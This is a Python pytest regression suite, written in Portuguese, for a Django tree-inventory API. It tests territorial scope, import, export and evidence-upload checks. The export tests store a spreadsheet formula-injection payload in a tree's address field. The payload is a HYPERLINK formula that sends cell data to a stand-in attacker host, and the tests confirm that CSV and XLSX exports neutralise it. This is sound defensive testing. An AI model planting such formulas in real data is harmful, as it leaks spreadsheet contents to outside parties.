"""Regressões dos achados da revisão de prontidão (escopo, importação, exportação)."""

import io
import json

import pytest
from django.core.files.uploadedfile import SimpleUploadedFile
from django.db import connection
from django.test.utils import CaptureQueriesContext
from openpyxl import load_workbook

from itree.evidencias.models import Evidencia
from itree.inventario.models import Arvore
from itree.ocorrencias.models import Ocorrencia
from itree.relatorios import views as relatorios
from itree.tarefas.models import Tarefa

from .conftest import PONTO_A, PONTO_B, com_escopo, criar_usuario
from .test_evidencias_mapa import s3  # noqa: F401 - fixture
from .test_f2 import inspecao, sincronizar

pytestmark = pytest.mark.django_db

IMPORTACOES = "/api/v1/importacoes"


def nova_arvore(cliente, usuario, ponto=PONTO_A, **extras):
    r = cliente.como(usuario).post(
        "/api/v1/arvores", {"localizacao": ponto, **extras}, format="json"
    )
    assert r.status_code == 201, r.json()
    return r.json()


def nova_tarefa(cliente, coordenador, arvore_id, responsavel):
    r = cliente.como(coordenador).post(
        "/api/v1/tarefas",
        {"tipo": "inspecao_arvore", "arvore_id": arvore_id, "responsavel_id": str(responsavel.id)},
        format="json",
    )
    assert r.status_code == 201, r.json()
    return r.json()


def importar(cliente, usuario, linhas: str, fonte="Inventário"):
    csv = "codigo;lat;lon;alt\n" + linhas
    return cliente.como(usuario).post(
        IMPORTACOES,
        {
            "arquivo": SimpleUploadedFile("i.csv", csv.encode()),
            "fonte": fonte,
            "campo_latitude": "lat",
            "campo_longitude": "lon",
            "campo_id_externo": "codigo",
            "campo_altura": "alt",
        },
        format="multipart",
    )


@pytest.fixture
def coordenador(territorios):
    return com_escopo(criar_usuario("coord@itree.teste", ["coordenador"]), territorios["municipio"])


@pytest.fixture
def revisor_a(territorios):
    """Revisor (pode importar) com escopo só no Bairro A."""
    return com_escopo(criar_usuario("ra@itree.teste", ["revisor"]), territorios["a"])


# --- Sincronização de inspeção e tarefas ---------------------------------------


def test_inspecao_nao_conclui_tarefa_de_outro_tecnico(
    cliente, coordenador, revisor, tecnico_a, territorios
):
    arvore = nova_arvore(cliente, revisor)
    colega = com_escopo(criar_usuario("colega@itree.teste", ["tecnico"]), territorios["a"])
    tarefa = nova_tarefa(cliente, coordenador, arvore["id"], colega)

    item = inspecao(arvore["id"], tarefa=tarefa["id"], enviar_para_revisao=True)
    resultado = sincronizar(cliente, tecnico_a, item).json()[0]
    assert resultado["status"] == "erro"
    assert Tarefa.objects.get(pk=tarefa["id"]).estado == "nao_iniciada"


def test_inspecao_nao_aceita_tarefa_de_outra_arvore(cliente, coordenador, revisor, tecnico_a):
    arvore, outra = nova_arvore(cliente, revisor), nova_arvore(cliente, revisor)
    tarefa = nova_tarefa(cliente, coordenador, outra["id"], tecnico_a)
    item = inspecao(arvore["id"], tarefa=tarefa["id"], enviar_para_revisao=True)
    assert sincronizar(cliente, tecnico_a, item).json()[0]["status"] == "erro"
    assert Tarefa.objects.get(pk=tarefa["id"]).estado == "nao_iniciada"


def test_alvo_da_tarefa_nao_muda_depois_de_criada(cliente, coordenador, revisor, tecnico_a):
    arvore, outra = nova_arvore(cliente, revisor), nova_arvore(cliente, revisor, PONTO_B)
    tarefa = nova_tarefa(cliente, coordenador, arvore["id"], tecnico_a)
    r = cliente.como(coordenador).patch(
        f"/api/v1/tarefas/{tarefa['id']}", {"arvore_id": outra["id"]}, format="json"
    )
    assert r.status_code == 400
    assert str(Tarefa.objects.get(pk=tarefa["id"]).arvore_id) == arvore["id"]


# --- Ocorrência ----------------------------------------------------------------


def test_ocorrencia_nao_pode_ser_vinculada_a_arvore_fora_do_escopo(
    cliente, revisor, tecnico_a, tipo_queda
):
    fora = nova_arvore(cliente, revisor, PONTO_B)
    r = cliente.como(tecnico_a).post(
        "/api/v1/ocorrencias",
        {"tipo_id": str(tipo_queda.id), "localizacao": PONTO_A, "descricao": "Galho"},
        format="json",
    )
    assert r.status_code == 201, r.json()
    r = cliente.patch(
        f"/api/v1/ocorrencias/{r.json()['id']}", {"arvore_id": fora["id"]}, format="json"
    )
    assert r.status_code == 400
    assert Ocorrencia.objects.get().arvore_id is None


# --- Importação ----------------------------------------------------------------


def test_importacao_recusa_pontos_fora_do_escopo(cliente, revisor_a):
    linhas = "A1;-3,755;-38,555;\nB1;-3,755;-38,535;\n"  # Bairro A, Bairro B
    lote = importar(cliente, revisor_a, linhas).json()
    assert lote["linhas_validas"] == 1
    erros = {linha["indice"]: linha["erros"] for linha in lote["linhas"]}
    assert erros[2] == ["Fora do seu escopo territorial."]
    r = cliente.post(f"{IMPORTACOES}/{lote['id']}/confirmar")
    assert r.status_code == 200
    assert Arvore.objects.get().bairro.nome == "Bairro A"


def test_lotes_alheios_ficam_invisiveis_para_escopo_restrito(cliente, revisor, revisor_a):
    lote = importar(cliente, revisor, "M1;-3,755;-38,535;\n").json()
    cliente.post(f"{IMPORTACOES}/{lote['id']}/confirmar")

    cliente.como(revisor_a)
    assert cliente.get(IMPORTACOES).json()["count"] == 0
    assert cliente.get(f"{IMPORTACOES}/{lote['id']}").status_code == 404
    r = cliente.post(f"{IMPORTACOES}/{lote['id']}/desfazer", {"motivo": "x"}, format="json")
    assert r.status_code == 404
    assert Arvore.objects.count() == 1
    # Quem tem escopo municipal continua vendo todos.
    assert cliente.como(revisor).get(IMPORTACOES).json()["count"] == 1


def test_desfazer_bloqueado_por_tarefa_vinculada(cliente, revisor, coordenador, tecnico_a):
    lote = importar(cliente, revisor, "T1;-3,755;-38,555;\n").json()
    cliente.post(f"{IMPORTACOES}/{lote['id']}/confirmar")
    nova_tarefa(cliente, coordenador, str(Arvore.objects.get().id), tecnico_a)

    cliente.como(revisor)
    assert cliente.get(f"{IMPORTACOES}/{lote['id']}").json()["pode_desfazer"] is False
    r = cliente.post(f"{IMPORTACOES}/{lote['id']}/desfazer", {"motivo": "erro"}, format="json")
    assert r.status_code == 400
    assert "tarefas" in str(r.json())


def test_confirmar_pre_visualizacao_obsoleta_e_recusado(cliente, revisor):
    primeiro = importar(cliente, revisor, "D1;-3,755;-38,555;\n").json()
    segundo = importar(cliente, revisor, "D1;-3,755;-38,555;\n").json()
    assert cliente.post(f"{IMPORTACOES}/{primeiro['id']}/confirmar").status_code == 200
    r = cliente.post(f"{IMPORTACOES}/{segundo['id']}/confirmar")
    assert r.status_code == 400
    assert "refaça" in str(r.json())
    assert Arvore.objects.count() == 1


@pytest.mark.parametrize("valor", ["Infinity", "-inf", "NaN"])
def test_valor_nao_finito_e_erro_na_pre_visualizacao(cliente, revisor, valor):
    lote = importar(cliente, revisor, f"N1;-3,755;-38,555;{valor}\n").json()
    assert lote["linhas_validas"] == 0
    assert any("inválido" in e for e in lote["linhas"][0]["erros"])


# --- Exportações ---------------------------------------------------------------

FORMULA = '=HYPERLINK("https://atacante.teste/?d="&A2;"Ver")'


@pytest.fixture
def arvore_maliciosa(cliente, revisor):
    return nova_arvore(cliente, revisor, endereco=FORMULA)


def test_exportacao_csv_neutraliza_formula(cliente, gestor_municipal, arvore_maliciosa):
    r = cliente.como(gestor_municipal).get(
        "/api/v1/relatorios/exportar", {"conjunto": "arvores", "formato": "csv"}
    )
    texto = r.content.decode("utf-8-sig")
    assert f"'{FORMULA}" in texto.replace('""', '"')
    assert ";=HYPERLINK" not in texto


def test_exportacao_xlsx_grava_formula_como_texto(cliente, gestor_municipal, arvore_maliciosa):
    r = cliente.como(gestor_municipal).get(
        "/api/v1/relatorios/exportar", {"conjunto": "arvores", "formato": "xlsx"}
    )
    planilha = load_workbook(io.BytesIO(r.content))["Dados"]
    cabecalho = [c.value for c in planilha[1]]
    celula = planilha.cell(row=2, column=cabecalho.index("endereco") + 1)
    assert celula.value == FORMULA
    assert celula.data_type == "s"


def test_exportacao_avisa_quando_corta(cliente, gestor_municipal, revisor, monkeypatch):
    for _ in range(3):
        nova_arvore(cliente, revisor)
    monkeypatch.setattr(relatorios, "LIMITE_EXPORTACAO", 2)
    r = cliente.como(gestor_municipal).get(
        "/api/v1/relatorios/exportar", {"conjunto": "arvores", "formato": "geojson"}
    )
    corpo = json.loads(r.content)
    assert len(corpo["features"]) == 2
    assert "cortado" in corpo["metadata"]["truncado"]


# --- Qualidade e escopo --------------------------------------------------------


def test_contagem_de_duplicidades_nao_fica_limitada_a_pagina(cliente, revisor, monkeypatch):
    from itree.inventario import duplicidades

    for _ in range(3):  # três árvores no mesmo ponto = três pares
        nova_arvore(cliente, revisor)
    monkeypatch.setattr(duplicidades, "RAIO_PADRAO_M", 3.0)
    pendencias = cliente.como(revisor).get("/api/v1/qualidade/pendencias").json()["pendencias"]
    item = next(p for p in pendencias if p["id"] == "possiveis_duplicidades")
    assert item["quantidade"] == 3
    assert len(duplicidades.pares_suspeitos(Arvore.objects.all(), limite=2)) == 2


def test_area_do_escopo_calculada_uma_vez_por_requisicao(cliente, gestor_municipal):
    cliente.como(gestor_municipal)
    with CaptureQueriesContext(connection) as consultas:
        assert cliente.get("/api/v1/indicadores/painel").status_code == 200
    unioes = [q for q in consultas.captured_queries if "ST_Union" in q["sql"]]
    assert len(unioes) == 1


# --- Evidências ----------------------------------------------------------------


def test_envio_assina_tamanho_e_apaga_arquivo_divergente(cliente, tecnico_a, s3):  # noqa: F811
    arvore = nova_arvore(cliente, tecnico_a)
    envio = cliente.post(
        "/api/v1/evidencias",
        {
            "arvore": arvore["id"],
            "nome_original": "a.png",
            "tipo_conteudo": "image/png",
            "tamanho": 99,
        },
        format="json",
    ).json()
    assert "content-length" in envio["url_envio"].lower()
    chave = Evidencia.objects.get(pk=envio["evidencia"]["id"]).chave
    s3.put_object(Bucket="itree-teste", Key=chave, Body=b"123")
    assert (
        cliente.post(f"/api/v1/evidencias/{envio['evidencia']['id']}/confirmar").status_code == 400
    )
    assert s3.list_objects_v2(Bucket="itree-teste").get("KeyCount", 0) == 0
